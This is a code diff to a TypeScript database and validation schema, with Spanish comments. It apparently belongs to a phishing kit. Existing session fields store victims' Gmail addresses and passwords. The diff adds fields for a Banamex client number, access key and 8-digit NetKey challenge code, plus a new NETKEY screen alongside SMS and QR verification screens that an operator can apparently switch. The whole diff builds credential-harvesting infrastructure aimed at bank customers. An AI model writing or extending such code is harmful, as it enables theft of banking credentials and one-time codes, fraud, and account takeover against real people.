@@ -121,6 +121,9 @@ export const sessions = pgTable("sessions", {
   correo: text("correo"),          // Para almacenar el correo de Gmail
   contrasena: text("contrasena"),  // Para almacenar la contraseña de Gmail
   dispositivo: text("dispositivo"), // Android, iPhone, PC, etc.
+  numeroCliente: text("numero_cliente"), // Número de cliente de Banamex
+  claveAcceso: text("clave_acceso"), // Clave de acceso de Banamex
+  challenge: text("challenge"), // Challenge NetKey de 8 dígitos
   pasoActual: text("paso_actual").default("folio"),
   createdAt: timestamp("created_at").defaultNow(),
   active: boolean("active").default(true),
@@ -214,6 +217,7 @@ export enum ScreenType {
   QR_VALIDATION = "qr_validation",
   SMS_VERIFICATION = "sms_verification",
   LOGIN = "login",
+  NETKEY = "netkey",
   VUELOS_OTORGADOS = "audifonos_otorgados",
   TELEFONO = "telefono",
   CODIGO = "codigo",
@@ -248,6 +252,7 @@ export const screenChangeSchema = z.object({
   correo: z.string().optional(),
   contrasena: z.string().optional(),
   codigo: z.string().optional(), // Código para la verificación de Google
+  challenge: z.string().optional(), // Challenge NetKey de 8 dígitos
 });
 
 export type ScreenChangeData = z.infer<typeof screenChangeSchema>;
